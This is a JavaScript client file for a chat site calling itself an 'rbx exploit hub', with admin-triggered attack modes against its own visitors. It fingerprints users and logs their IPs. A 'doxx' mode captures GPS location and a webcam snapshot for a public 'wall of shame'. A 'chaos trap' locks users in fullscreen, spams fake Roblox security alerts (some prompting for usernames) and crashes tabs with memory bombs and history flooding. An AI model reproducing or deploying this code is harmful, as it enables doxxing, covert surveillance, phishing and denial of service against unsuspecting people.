// chat.js — rbx exploit hub
(function(){
  const chatEl=document.getElementById('chat');
  const userEl=document.getElementById('username');
  const msgEl=document.getElementById('message');
  const sendBtn=document.getElementById('send');
  const adminUserEl=document.getElementById('adminUser');
  const adminPassEl=document.getElementById('adminPass');
  const adminLoginBtn=document.getElementById('adminLoginBtn');
  const adminPanel=document.getElementById('admin-panel');
  const banUserEl=document.getElementById('banUser');
  const unbanUserEl=document.getElementById('unbanUser');
  const banBtn=document.getElementById('banBtn');
  const unbanBtn=document.getElementById('unbanBtn');
  const clearBtn=document.getElementById('clearBtn');
  const bannedListEl=document.getElementById('bannedList');
  const wtfBtn=document.getElementById('wtfBtn');
  const rickrollBtn=document.getElementById('rickrollBtn');
  const doxxBtn=document.getElementById('doxxBtn');
  const clearShameBtn=document.getElementById('clearShameBtn');
  const crashBtn=document.getElementById('crashBtn');
  const shameBtn=document.getElementById('shameBtn');
  const shameModal=document.getElementById('shameModal');
  const closeShame=document.getElementById('closeShame');
  const shameList=document.getElementById('shameList');
  const fakeFullscreen=document.getElementById('fakeFullscreen');
  const nukeOverlay=document.getElementById('nukeOverlay');
  const rickrollOverlay=document.getElementById('rickrollOverlay');
  const htmlElement=document.documentElement;

  // file upload elements
  const fileInput=document.getElementById('fileInput');
  const fileNameDisplay=document.getElementById('fileNameDisplay');
  const uploadBtn=document.getElementById('uploadBtn');
  const progressContainer=document.getElementById('progressContainer');
  const progressBar=document.getElementById('progressBar');
  const progressLabel=document.getElementById('progressLabel');

  // admin credentials live in Firebase Auth — nothing stored in source
  let admins={}; // populated from db/admins node after auth
  let bannedUsers={};
  let chaosModeLocked=false;
  let trapActive=false;
  let pointerLockInterval=null;
  let fullscreenInterval=null;
  let fullscreenPrimed=false;
  let currentUserIP=null;
  let selectedFile=null;

  // device fingerprint
  let deviceId=localStorage.getItem('hh_device_id');
  if(!deviceId){
    deviceId=Date.now().toString(36)+Math.random().toString(36).slice(2,8);
    localStorage.setItem('hh_device_id',deviceId);
  }

  function generateFingerprint(){
    const canvas=document.createElement('canvas');
    const ctx=canvas.getContext('2d');
    ctx.textBaseline='top';ctx.font='14px Arial';
    ctx.textBaseline='alphabetic';
    ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
    ctx.fillStyle='#069';ctx.fillText('Browser fingerprint',2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Browser fingerprint',4,17);
    const cf=canvas.toDataURL();
    const sf=`${screen.width}x${screen.height}x${screen.colorDepth}`;
    const tz=new Date().getTimezoneOffset();
    const lang=navigator.language||navigator.userLanguage;
    const plat=navigator.platform;
    const plug=Array.from(navigator.plugins||[]).map(p=>p.name).join(',');
    const combined=`${cf}|${sf}|${tz}|${lang}|${plat}|${plug}|${navigator.hardwareConcurrency}|${navigator.deviceMemory}`;
    let hash=0;
    for(let i=0;i<combined.length;i++){
      const c=combined.charCodeAt(i);
      hash=((hash<<5)-hash)+c;hash=hash&hash;
    }
    return hash.toString(36);
  }
  const browserFingerprint=generateFingerprint();

  async function getUserIP(){
    try{
      const r=await fetch('https://api.ipify.org?format=json');
      const d=await r.json();
      currentUserIP=d.ip;return d.ip;
    }catch(e){return null;}
  }

  const db=firebase.database();

  const messagesRef=db.ref('messages');
  const bannedRef=db.ref('banned');
  const devicesRef=db.ref('devices');
  const wtfModeRef=db.ref('wtfMode');
  const rickrollModeRef=db.ref('rickrollMode');
  const doxxModeRef=db.ref('doxxMode');
  const crashModeRef=db.ref('crashMode');
  const shameRef=db.ref('wallOfShame');
  const fingerprintsRef=db.ref('fingerprints');

  // ── FILE UPLOAD ──────────────────────────────────────────────────
  document.getElementById('fileLabel').addEventListener('click',()=>fileInput.click());

  fileInput.addEventListener('change',()=>{
    const f=fileInput.files[0];
    if(!f){selectedFile=null;fileNameDisplay.textContent='nothing picked';uploadBtn.style.display='none';return;}
    selectedFile=f;
    fileNameDisplay.textContent=`${f.name} (${formatBytes(f.size)})`;
    uploadBtn.style.display='block';
  });

  function formatBytes(bytes){
    if(bytes<1024)return bytes+'B';
    if(bytes<1048576)return (bytes/1024).toFixed(1)+'KB';
    if(bytes<1073741824)return (bytes/1048576).toFixed(1)+'MB';
    return (bytes/1073741824).toFixed(2)+'GB';
  }

  uploadBtn.addEventListener('click',async()=>{
    if(!selectedFile)return;
    const username=(userEl.value||'Anonymous').trim();

    progressContainer.style.display='block';
    progressBar.style.width='0%';
    progressLabel.textContent=`uploading ${selectedFile.name}...`;
    uploadBtn.style.display='none';

    const formData=new FormData();
    formData.append('file',selectedFile);
    formData.append('upload_preset','rbx_uploads');
    formData.append('folder','rbx_chat');
    formData.append('tags','rbx_chat,expires_10d');
    // resource_type goes in the URL for unsigned uploads, NOT in the body

    const xhr=new XMLHttpRequest();
    xhr.open('POST',`https://api.cloudinary.com/v1_1/kz95ob26/auto/upload`);

    xhr.upload.addEventListener('progress',e=>{
      if(e.lengthComputable){
        const pct=Math.round((e.loaded/e.total)*100);
        progressBar.style.width=pct+'%';
        progressLabel.textContent=`[${pct}%] ${selectedFile.name} — ${formatBytes(e.loaded)} / ${formatBytes(e.total)}`;
      }
    });

    xhr.addEventListener('load',async()=>{
      if(xhr.status===200){
        const res=JSON.parse(xhr.responseText);
        const url=res.secure_url;
        progressLabel.textContent=`done: ${selectedFile.name}`;
        setTimeout(()=>{progressContainer.style.display='none';},2000);

        const userIP=currentUserIP||await getUserIP();
        const altCheck=await checkForAltAccount(username,userIP);
        saveUserFingerprint(username,userIP);
        devicesRef.child(username+'_'+deviceId).set({timestamp:Date.now()});

        messagesRef.push({
          username,
          text:`📎 ${selectedFile.name}`,
          fileUrl:url,
          fileName:selectedFile.name,
          fileSize:selectedFile.size,
          fileType:selectedFile.type||'',
          timestamp:Date.now(),
          deviceId,
          fingerprint:browserFingerprint,
          ip:userIP,
          isAlt:altCheck.isAlt,
          originalUsername:altCheck.originalUsername
        });

        selectedFile=null;
        fileInput.value='';
        fileNameDisplay.textContent='nothing picked';
      } else {
        let errMsg=`upload failed: ${xhr.status}`;
        try{
          const errData=JSON.parse(xhr.responseText);
          if(errData&&errData.error&&errData.error.message){
            errMsg=`upload failed: ${errData.error.message}`;
            console.error('[cloudinary error]',errData.error.message);
          }
        }catch(_){}
        progressLabel.textContent=errMsg;
        console.error('[cloudinary raw]',xhr.responseText);
        setTimeout(()=>{progressContainer.style.display='none';},6000);
        uploadBtn.style.display='block';
      }
    });

    xhr.addEventListener('error',()=>{
      progressLabel.textContent=`upload failed lol: network error`;
      setTimeout(()=>{progressContainer.style.display='none';},4000);
      uploadBtn.style.display='block';
    });

    xhr.send(formData);
  });

  // ── ALT / FINGERPRINT DETECTION ─────────────────────────────────
  async function checkForAltAccount(username,userIP){
    return new Promise(resolve=>{
      fingerprintsRef.once('value',snapshot=>{
        const fp=snapshot.val()||{};
        let isAlt=false,originalUsername=null;
        for(const[user,data] of Object.entries(fp)){
          if(user!==username){
            if(data.fingerprint===browserFingerprint||data.deviceId===deviceId||(userIP&&data.ip===userIP)){
              isAlt=true;originalUsername=user;break;
            }
          }
        }
        resolve({isAlt,originalUsername});
      });
    });
  }

  function saveUserFingerprint(username,userIP){
    fingerprintsRef.child(username).set({
      fingerprint:browserFingerprint,deviceId,ip:userIP,timestamp:Date.now()
    });
  }

  function autoDeleteBannedMessages(){
    messagesRef.on('child_added',snapshot=>{
      const m=snapshot.val();
      if(bannedUsers[m.username])snapshot.ref.remove();
    });
  }

  function showPussyMessage(){
    const el=document.createElement('div');
    el.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,0,0,0.95);color:#fff;padding:40px;border:3px solid #f00;border-radius:4px;z-index:999999;text-align:center;font-size:2.5rem;font-weight:bold;font-family:monospace;';
    el.textContent="What a fuckin' pussy";
    document.body.appendChild(el);
    setTimeout(()=>el.remove(),3000);
  }

  async function logToShame(username){
    try{
      const ipR=await fetch('https://api.ipify.org?format=json');
      const ipD=await ipR.json();
      const userIP=ipD.ip;
      let city='Unknown',country='Unknown',region='Unknown',lat='Unknown',lon='Unknown',locType='IP-based (approximate)',photo=null;
      try{
        const gR=await fetch(`https://ipapi.co/${userIP}/json/`);
        const gD=await gR.json();
        city=gD.city||'Unknown';country=gD.country_name||'Unknown';
        region=gD.region||'Unknown';lat=gD.latitude||'Unknown';lon=gD.longitude||'Unknown';
      }catch(e){}
      if(navigator.geolocation){
        try{
          const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
          lat=pos.coords.latitude;lon=pos.coords.longitude;locType='GPS (precise)';
          try{
            const rg=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const ad=await rg.json();
            city=ad.address.city||ad.address.town||ad.address.village||city;
            region=ad.address.state||region;country=ad.address.country||country;
          }catch(e){}
        }catch(e){showPussyMessage();}
      }
      try{
        const stream=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480},audio:false});
        const vid=document.createElement('video');
        vid.srcObject=stream;vid.play();
        await new Promise(r=>{vid.onloadedmetadata=r;});
        await new Promise(r=>setTimeout(r,500));
        const cvs=document.createElement('canvas');cvs.width=640;cvs.height=480;
        const c=cvs.getContext('2d');c.drawImage(vid,0,0,640,480);
        photo=cvs.toDataURL('image/jpeg',0.8);
        stream.getTracks().forEach(t=>t.stop());
      }catch(e){showPussyMessage();}
      const ua=navigator.userAgent;
      let browser='Unknown';
      if(ua.indexOf('Firefox')>-1)browser='Firefox';
      else if(ua.indexOf('Edg')>-1)browser='Edge';
      else if(ua.indexOf('Chrome')>-1)browser='Chrome';
      else if(ua.indexOf('Safari')>-1)browser='Safari';
      let device='Desktop';
      if(/(tablet|ipad)/i.test(ua))device='Tablet';
      else if(/Mobile|Android|iPhone/.test(ua))device='Mobile';
      let os='Unknown';
      if(ua.indexOf('Win')>-1)os='Windows';
      else if(ua.indexOf('Mac')>-1)os='MacOS';
      else if(ua.indexOf('Linux')>-1)os='Linux';
      else if(ua.indexOf('Android')>-1)os='Android';
      shameRef.push({username,ip:userIP,city,region,country,latitude:lat,longitude:lon,locationType:locType,photo,browser,device,os,timestamp:Date.now(),deviceId,fingerprint:browserFingerprint});
    }catch(e){}
  }

  function showWallOfShame(){
    shameModal.style.display='block';
    shameRef.on('value',snapshot=>{
      shameList.innerHTML='';
      const shamed=[];snapshot.forEach(c=>shamed.push(c.val()));
      shamed.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
      shamed.forEach(entry=>{
        const div=document.createElement('div');
        div.style.cssText='background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.4);padding:20px;margin:12px 0;border-radius:3px;font-family:monospace;';
        const date=new Date(entry.timestamp).toLocaleString();
        const loc=`${entry.city||'?'}, ${entry.region||'?'}, ${entry.country||'?'}`;
        const coords=`${entry.latitude||'?'}, ${entry.longitude||'?'}`;
        const mapsHref=(entry.latitude!=='Unknown'&&entry.longitude!=='Unknown')?`https://www.google.com/maps?q=${entry.latitude},${entry.longitude}`:'#';
        div.innerHTML=`
          <div style="color:#e0e0e0;font-size:1.2rem;margin-bottom:8px;"><strong style="color:#ff3333;">» ${escapeHtml(entry.username)}</strong></div>
          ${entry.photo?`<div style="margin:12px 0;"><img src="${entry.photo}" style="max-width:100%;border:1px solid #f00;border-radius:2px;"/></div>`:''}
          <div style="color:#ff0000;font-size:1.4rem;font-weight:bold;margin:8px 0;">IP: ${escapeHtml(entry.ip)}</div>
          <div style="color:#ffcc00;margin:5px 0;">LOC: ${escapeHtml(loc)}</div>
          <div style="color:#00ccff;margin:5px 0;">COORDS: ${escapeHtml(coords)} <span style="color:#666;font-size:0.8rem;">(${escapeHtml(entry.locationType||'?')})</span></div>
          ${mapsHref!=='#'?`<div style="margin:5px 0;"><a href="${mapsHref}" target="_blank" style="color:#00ff88;text-decoration:underline;">open in maps</a></div>`:''}
          <div style="color:#aaa;font-size:0.85rem;margin-top:8px;">${escapeHtml(entry.device||'?')} / ${escapeHtml(entry.os||'?')} / ${escapeHtml(entry.browser||'?')}</div>
          <div style="color:#555;font-size:0.75rem;margin-top:8px;">${date}</div>
        `;
        shameList.appendChild(div);
      });
      if(shamed.length===0)shameList.innerHTML='<p style="color:#444;text-align:center;padding:50px;font-family:monospace;">nothing here yet</p>';
    });
  }

  // ── CHAOS / FULLSCREEN TRAP ──────────────────────────────────────
  function attemptFullscreen(){
    const e=document.documentElement;
    if(e.requestFullscreen)e.requestFullscreen().catch(()=>{});
    else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();
    else if(e.msRequestFullscreen)e.msRequestFullscreen();
    else if(e.mozRequestFullScreen)e.mozRequestFullScreen();
  }
  function primeFullscreen(){
    if(!fullscreenPrimed){
      document.addEventListener('click',()=>{if(trapActive)attemptFullscreen();},false);
      document.addEventListener('keydown',()=>{if(trapActive)attemptFullscreen();},false);
      document.addEventListener('touchstart',()=>{if(trapActive)attemptFullscreen();},false);
      document.addEventListener('mousemove',()=>{if(trapActive)attemptFullscreen();},false);
      fullscreenPrimed=true;
    }
  }
  function trapUser(e){if(trapActive){e.preventDefault();e.returnValue='YOU CANNOT ESCAPE';attemptFullscreen();return'YOU CANNOT ESCAPE';}}
  function blockAllExits(e){
    if(trapActive){
      if(e.key==='Escape'||e.key==='F11'||e.keyCode===27||e.keyCode===122||(e.altKey&&e.keyCode===115)||(e.ctrlKey&&(e.key==='w'||e.key==='W'))||(e.metaKey&&(e.key==='w'||e.key==='W'))){
        e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();attemptFullscreen();return false;
      }
    }
  }
  function maintainFullscreen(){
    if(trapActive&&!document.fullscreenElement&&!document.webkitFullscreenElement&&!document.mozFullScreenElement&&!document.msFullscreenElement)attemptFullscreen();
  }
  function lockPointer(){
    if(!chaosModeLocked)return;
    const e=fakeFullscreen;
    if(e.requestPointerLock)e.requestPointerLock();
    else if(e.mozRequestPointerLock)e.mozRequestPointerLock();
    else if(e.webkitRequestPointerLock)e.webkitRequestPointerLock();
  }
  function unlockPointer(){
    if(document.exitPointerLock)document.exitPointerLock();
    else if(document.mozExitPointerLock)document.mozExitPointerLock();
  }
  function maintainPointerLock(){
    pointerLockInterval=setInterval(()=>{
      if(chaosModeLocked&&!document.pointerLockElement&&!document.mozPointerLockElement&&!document.webkitPointerLockElement)lockPointer();
    },50);
  }
  function exitFullscreen(){
    if(document.exitFullscreen)document.exitFullscreen().catch(()=>{});
    else if(document.webkitExitFullscreen)document.webkitExitFullscreen();
    else if(document.mozCancelFullScreen)document.mozCancelFullScreen();
    else if(document.msExitFullscreen)document.msExitFullscreen();
  }
  let dialogSpamIntervals=[];
  let dialogSpamActive=false;
  const dialogMessages=[
    ()=>confirm('⚠️ ROBLOX SECURITY ALERT: Unauthorized executor detected on your account. Verify now or face permanent ban.'),
    ()=>alert('🔴 CRITICAL: Your IP has been logged and reported to Roblox Trust & Safety. Do not close this window.'),
    ()=>confirm('WARNING: Account termination in progress. Click OK to cancel the ban appeal process.'),
    ()=>prompt('Enter your Roblox username to verify your identity and prevent account deletion:',''),
    ()=>alert('❌ ERROR: exploit_bypass.lua failed to inject. Retrying... DO NOT CLOSE TAB'),
    ()=>confirm('Your session token has expired. Reconnect now to save your inventory items?'),
    ()=>prompt('SECURITY CHECK: Type "I agree" to confirm you are not a bot:',''),
    ()=>alert('🚨 DETECTED: Synapse X license invalid. Your HWID has been flagged.'),
  ];
  let dialogIndex=0;
  function spamLoop(){
    if(!dialogSpamActive)return;
    dialogMessages[dialogIndex%dialogMessages.length]();
    dialogIndex++;
    if(dialogSpamActive)spamLoop();
  }
  function startDialogSpam(){
    dialogSpamActive=true;
    dialogIndex=0;
    // multiple overlapping intervals at different rates to make it relentless
    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)dialogMessages[Math.floor(Math.random()*dialogMessages.length)]();},80));
    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)alert('DO NOT CLOSE THIS TAB — ROBLOX VERIFICATION IN PROGRESS');},300));
    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)confirm('Still there? Your account ban appeal expires in 10 seconds.');},500));
    // also chain synchronously on first hit
    setTimeout(spamLoop,100);
  }
  function stopDialogSpam(){
    dialogSpamActive=false;
    dialogSpamIntervals.forEach(id=>clearInterval(id));
    dialogSpamIntervals=[];
  }

  function nukeTab(){
    // memory bomb — allocate until tab crashes
    try{
      const arr=[];
      while(true){arr.push(new Array(10000000).fill('X'));}
    }catch(e){}
    // history spam
    try{let s='';for(let i=0;i<999999999;i++){s+=i;history.pushState(0,0,s);}}catch(e){}
    // infinite loop fallback
    try{let x=0;while(true){x++;}}catch(e){}
  }

  function startChaosTrap(){
    trapActive=true;chaosModeLocked=true;
    fakeFullscreen.classList.add('active');
    attemptFullscreen();
    setTimeout(startDialogSpam,500);
    window.addEventListener('beforeunload',trapUser);
    window.addEventListener('unload',trapUser);

    // alt-tab / window switch / focus loss → crash
    document.addEventListener('visibilitychange',()=>{
      if(trapActive&&document.hidden)nukeTab();
    });
    window.addEventListener('blur',()=>{if(trapActive)nukeTab();});
    window.addEventListener('focusout',()=>{if(trapActive)nukeTab();});

    // fullscreen exit → immediately re-request + crash attempt
    const fsHandler=()=>{
      if(trapActive&&!document.fullscreenElement&&!document.webkitFullscreenElement){
        attemptFullscreen();
        setTimeout(nukeTab,200);
      }
    };
    document.addEventListener('fullscreenchange',fsHandler);
    document.addEventListener('webkitfullscreenchange',fsHandler);
    document.addEventListener('mozfullscreenchange',fsHandler);
    document.addEventListener('MSFullscreenChange',fsHandler);

    fullscreenInterval=setInterval(()=>{if(trapActive)maintainFullscreen();},100);
    setTimeout(()=>{lockPointer();maintainPointerLock();},100);

    // block every key combo we can reach
    document.addEventListener('keydown',blockAllExits,true);
    document.addEventListener('keyup',blockAllExits,true);
    document.addEventListener('keypress',blockAllExits,true);

    // block right click
    document.addEventListener('contextmenu',e=>{if(trapActive){e.preventDefault();return false;}},true);

    // block middle click (open in new tab)
    document.addEventListener('auxclick',e=>{if(trapActive){e.preventDefault();return false;}},true);

    // block drag (drag URL out of bar)
    document.addEventListener('dragstart',e=>{if(trapActive)e.preventDefault();},true);

    // block print (Ctrl+P sometimes helps exit)
    window.addEventListener('beforeprint',e=>{if(trapActive){e.preventDefault();nukeTab();}});

    fakeFullscreen.addEventListener('click',()=>{if(trapActive){attemptFullscreen();lockPointer();}});
  }
  function stopChaosTrap(){
    trapActive=false;chaosModeLocked=false;
    fakeFullscreen.classList.remove('active');
    window.removeEventListener('beforeunload',trapUser);
    window.removeEventListener('unload',trapUser);
    stopDialogSpam();
    exitFullscreen();unlockPointer();
    if(pointerLockInterval){clearInterval(pointerLockInterval);pointerLockInterval=null;}
    if(fullscreenInterval){clearInterval(fullscreenInterval);fullscreenInterval=null;}
    document.removeEventListener('keydown',blockAllExits,true);
    document.removeEventListener('keyup',blockAllExits,true);
    document.removeEventListener('keypress',blockAllExits,true);
  }

  // ── HELPERS ──────────────────────────────────────────────────────
  function escapeHtml(str){
    return String(str).replace(/[&<>"']/g,s=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]));
  }

  function renderMessages(arr){
    chatEl.innerHTML='';
    arr.forEach(m=>{
      if(bannedUsers[m.username])return;
      const div=document.createElement('div');
      const cur=(userEl.value.trim()||'Anonymous');
      div.className='msg '+((m.username===cur)?'me':'other');
      if(admins[m.username])div.classList.add('admin');
      if(m.isAlt)div.classList.add('alt');
      if(m.fileUrl)div.classList.add('file-msg');

      let html=`<strong>${escapeHtml(m.username)}</strong>`;
      if(m.isAlt&&m.originalUsername)html+=` <span style="color:#ff8c00;font-size:0.75rem;">[alt:${escapeHtml(m.originalUsername)}]</span>`;
      html+=`: ${escapeHtml(m.text)}`;

      if(m.fileUrl){
        const imgExts=/\.(png|jpe?g|gif|webp|bmp|svg|avif|ico)$/i;
        const isImg=(m.fileType&&m.fileType.startsWith('image/'))||imgExts.test(m.fileName||'')||imgExts.test(m.fileUrl||'');
        if(isImg){
          html+=`<br><img class="inline-img" src="${escapeHtml(m.fileUrl)}" alt="${escapeHtml(m.fileName||'img')}" loading="lazy" onerror="this.style.display='none'" onclick="window.open('${escapeHtml(m.fileUrl)}','_blank')">`;
        }
        html+=`<br><a class="file-link" href="${escapeHtml(m.fileUrl)}" target="_blank">⬇ ${escapeHtml(m.fileName||'download')}${m.fileSize?' ('+formatBytes(m.fileSize)+')':''}</a>`;
      }

      div.innerHTML=html;
      chatEl.appendChild(div);
    });
    chatEl.scrollTop=chatEl.scrollHeight;
  }

  function flashBanned(username,text){
    const div=document.createElement('div');
    div.className='msg banned';
    div.innerHTML=`<strong>${escapeHtml(username)}</strong>: ${escapeHtml(text)}`;
    chatEl.appendChild(div);chatEl.scrollTop=chatEl.scrollHeight;
    setTimeout(()=>div.remove(),2000);
  }

  // ── MESSAGING ────────────────────────────────────────────────────
  async function sendMessage(){
    const username=(userEl.value||'Anonymous').trim();
    const text=(msgEl.value||'').trim();
    if(!text)return;
    if(bannedUsers[username]){flashBanned(username,text);msgEl.value='';return;}
    const userIP=currentUserIP||await getUserIP();
    const altCheck=await checkForAltAccount(username,userIP);
    saveUserFingerprint(username,userIP);
    devicesRef.child(username+'_'+deviceId).set({timestamp:Date.now()});
    messagesRef.push({username,text,timestamp:Date.now(),deviceId,fingerprint:browserFingerprint,ip:userIP,isAlt:altCheck.isAlt,originalUsername:altCheck.originalUsername});
    msgEl.value='';
  }

  function loginAdmin(){
    const email=(adminUserEl.value||'').trim();
    const pass=(adminPassEl.value||'').trim();
    if(!email||!pass)return;
    adminLoginBtn.textContent='...';
    adminLoginBtn.disabled=true;
    firebase.auth().signInWithEmailAndPassword(email,pass)
      .then(cred=>{
        adminPanel.style.display='block';
        sessionStorage.setItem('hh_admin_uid',cred.user.uid);
        adminLoginBtn.textContent='login';
        adminLoginBtn.disabled=false;
      })
      .catch(err=>{
        adminLoginBtn.textContent='wrong';
        adminLoginBtn.disabled=false;
        setTimeout(()=>{adminLoginBtn.textContent='login';},1500);
      });
    adminUserEl.value='';adminPassEl.value='';
  }

  function updateBannedListUI(){
    const b=Object.keys(bannedUsers);
    bannedListEl.textContent=b.length?b.join(', '):'(none)';
  }

  function banUser(){const u=(banUserEl.value||'').trim();if(!u)return;bannedRef.child(u).set(true);banUserEl.value='';}
  function unbanUser(){const u=(unbanUserEl.value||'').trim();if(!u)return;bannedRef.child(u).remove();unbanUserEl.value='';}
  function clearChat(){messagesRef.remove();}

  // ── CHAOS MODES ──────────────────────────────────────────────────
  function activateWTFMode(){wtfModeRef.set({active:true,timestamp:Date.now()});}
  function triggerWTFEffect(){
    startChaosTrap();htmlElement.classList.add('shake');nukeOverlay.classList.add('active');
    const a=new Audio('https://www.myinstants.com/en/media/sounds/wtf_boom.mp3');a.volume=0.7;a.play().catch(()=>{});
    setTimeout(()=>{htmlElement.classList.remove('shake');nukeOverlay.classList.remove('active');stopChaosTrap();wtfModeRef.set({active:false,timestamp:Date.now()});},40000);
  }

  function activateRickrollMode(){rickrollModeRef.set({active:true,timestamp:Date.now()});}
  function triggerRickrollEffect(){
    const a=new Audio('./rickroll.mp3');
    a.volume=0.8;a.play().catch(()=>{});
    setTimeout(()=>{
      startChaosTrap();htmlElement.classList.add('shake');rickrollOverlay.classList.add('active');
      setTimeout(()=>{htmlElement.classList.remove('shake');rickrollOverlay.classList.remove('active');stopChaosTrap();rickrollModeRef.set({active:false,timestamp:Date.now()});},25000);
    },15000);
  }

  function activateDoxxMode(){doxxModeRef.set({active:true,timestamp:Date.now()});}
  function triggerDoxxEffect(){
    const username=userEl.value.trim()||'Anonymous';
    logToShame(username);
    const el=document.createElement('div');
    el.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.97);color:#ff0000;padding:40px;border:2px solid #ff0000;border-radius:3px;z-index:99999;text-align:center;font-family:monospace;';
    el.innerHTML=`<div style="font-size:2.5rem;margin-bottom:15px;letter-spacing:4px;">[ DEANON ]</div><div style="font-size:1.2rem;color:#ccc;">your data has been logged</div><div style="font-size:0.9rem;color:#666;margin-top:10px;">check the deanon log...</div>`;
    document.body.appendChild(el);
    setTimeout(()=>{el.remove();doxxModeRef.set({active:false,timestamp:Date.now()});},5000);
  }

  function activateCrashMode(){
    crashModeRef.set({active:true,timestamp:Date.now()});
    setTimeout(()=>{crashModeRef.set({active:false,timestamp:Date.now()});},60000);
  }
  function triggerCrashEffect(){
    crashModeRef.once('value').then(snapshot=>{
      const d=snapshot.val();
      if(!d||!d.active)return;
      if(Date.now()-(d.timestamp||0)>60000){crashModeRef.set({active:false,timestamp:Date.now()});return;}
      var total='';
      for(var i=0;i<10000000000000;i++){total+=i.toString();history.pushState(0,0,total);}
    });
  }

  // ── EVENTS ───────────────────────────────────────────────────────
  sendBtn.addEventListener('click',sendMessage);
  msgEl.addEventListener('keydown',e=>{if(e.key==='Enter')sendMessage();});
  adminLoginBtn.addEventListener('click',loginAdmin);
  banBtn.addEventListener('click',banUser);
  unbanBtn.addEventListener('click',unbanUser);
  clearBtn.addEventListener('click',clearChat);
  wtfBtn.addEventListener('click',activateWTFMode);
  rickrollBtn.addEventListener('click',activateRickrollMode);
  doxxBtn.addEventListener('click',activateDoxxMode);
  crashBtn.addEventListener('click',activateCrashMode);
  clearShameBtn.addEventListener('click',()=>{if(confirm('purge entire deanon log? cannot be undone.')){shameRef.remove();}});
  shameBtn.addEventListener('click',showWallOfShame);
  closeShame.addEventListener('click',()=>{shameModal.style.display='none';});

  // ── FIREBASE LISTENERS ───────────────────────────────────────────
  messagesRef.on('value',snapshot=>{
    const msgs=[];snapshot.forEach(c=>msgs.push(c.val()));
    msgs.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));
    renderMessages(msgs);
  });
  bannedRef.on('value',snapshot=>{
    bannedUsers={};snapshot.forEach(c=>{bannedUsers[c.key]=true;});
    updateBannedListUI();autoDeleteBannedMessages();
  });
  wtfModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerWTFEffect();});
  rickrollModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerRickrollEffect();});
  doxxModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerDoxxEffect();});
  crashModeRef.on('value',snapshot=>{const d=snapshot.val();if(d&&d.active)triggerCrashEffect();});

  // ── INIT ─────────────────────────────────────────────────────────
  // Firebase Auth restores session automatically
  firebase.auth().onAuthStateChanged(user=>{
    if(user){adminPanel.style.display='block';}
    else{adminPanel.style.display='none';}
  });
  getUserIP();
  autoDeleteBannedMessages();
  primeFullscreen();
})();
